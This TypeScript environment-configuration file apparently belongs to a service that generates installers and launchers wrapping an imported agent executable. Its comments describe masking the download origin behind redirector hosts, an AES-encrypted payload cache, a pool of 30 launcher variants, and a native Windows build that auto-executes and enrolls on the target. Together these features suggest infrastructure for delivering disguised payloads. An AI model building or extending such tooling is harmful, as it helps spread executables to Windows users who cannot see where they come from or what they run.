/**
 * Typed environment configuration with validation.
 * Fails loudly at startup if any required value is missing.
 */

// Load .env from the generator/ directory before any process.env reads happen.
import "dotenv/config";

function required(key: string): string {
  const value = process.env[key];
  if (!value) {
    console.error(`Error: Environment variable ${key} is required but not set.`);
    process.exit(1);
  }
  return value;
}

function optional(key: string, fallback: string): string {
  const value = process.env[key];
  return value && value.trim() !== "" ? value.trim() : fallback;
}

function number(key: string, defaultValue: number): number {
  const value = process.env[key];
  if (!value) {
    return defaultValue;
  }
  const parsed = parseInt(value, 10);
  if (isNaN(parsed)) {
    console.error(
      `Error: Environment variable ${key}="${value}" is not a valid number.`
    );
    process.exit(1);
  }
  return parsed;
}

export const env = {
  PORT: number("PORT", 4000),
  GENERATOR_SECRET: required("GENERATOR_SECRET"),
  MSI_BUILDER_PATH: required("MSI_BUILDER_PATH"),
  PUBLIC_URL: required("PUBLIC_URL"),
  JOB_TTL_HOURS: number("JOB_TTL_HOURS", 72),

  // Masked, customer-facing download host (STAGE 2). The handed zip link is
  // `${REDIRECT_BASE_URL}/d/<jobId>` so the generator's actual origin never
  // appears in the URL. Sensible default: unset → PUBLIC_URL (the generator's
  // own public origin), which works end-to-end for dev/lab. To ACTUALLY mask
  // the origin, set REDIRECT_BASE_URL to the separate link-routing/redirector
  // host (e.g. https://dl.vantra.instaweb.top) that 302s /d/<jobId> →
  // <PUBLIC_URL>/downloads/<jobId>/zip.
  REDIRECT_BASE_URL: optional("REDIRECT_BASE_URL", ""),

  // Task 74 (public/private download-host split): the PUBLIC-tier download
  // host (e.g. https://dl.broks.beauty). The generator never tiers by itself —
  // the Vantra web app passes `downloadHost` per build (validated against this
  // allowlist); this env value only documents/centralizes the expected public
  // host for operators. Empty = no allowlist entry from env (built-in defaults
  // below still apply).
  PUBLIC_DOWNLOAD_BASE_URL: optional("PUBLIC_DOWNLOAD_BASE_URL", ""),

  // ---- Launcher mode (WP2/WP3) ----
  // Path of the one-time imported agent exe (operator drop on the VPS). The
  // launcher mode NEVER fetches it at request time; the import happens at
  // startup (or via the authed POST /payload endpoint).
  PAYLOAD_PATH: optional("PAYLOAD_PATH", ""),
  // 64-hex AES-256 master key for the payload cache. When unset a random key
  // is generated once and persisted under generator/payload-cache/master.key
  // (0600) — production should pin this env var instead.
  PAYLOAD_MASTER_KEY: optional("PAYLOAD_MASTER_KEY", ""),
  // Optional explicit path to the mono C# compiler for launcher builds
  // (default: `mcs` on PATH). The VPS needs mono-mcs only for launcher mode.
  MONO_MCS_PATH: optional("MONO_MCS_PATH", ""),
  // Option 3: build the launcher as a NATIVE Windows PE (MinGW cross-compile)
  // instead of Mono IL. `1` enables it; when on, the target needs no Mono/.NET
  // runtime and auto-executes + auto-enrolls on a stock Windows host.
  LAUNCHER_NATIVE: process.env["LAUNCHER_NATIVE"]?.trim() === "1",
  // Cross compiler for the native path (build-native.sh default is
  // `x86_64-w64-mingw32-gcc`).
  NATIVE_CC: optional("NATIVE_CC", "x86_64-w64-mingw32-gcc"),
  // Warm launcher pool size (number of pre-compiled launcher variants kept).
  LAUNCHER_POOL_SIZE: number("LAUNCHER_POOL_SIZE", 30),

  // Dev-loop helper (never set in production): when == "1", POST /build accepts
  // an operator-local absolute `pdfPath` for the attached guide PDF so the
  // localhost test harness can bake a file straight from disk (instead of the
  // base64 `pdf` transport the web app uses).
  ALLOW_LOCAL_PDF: optional("ALLOW_LOCAL_PDF", ""),

};
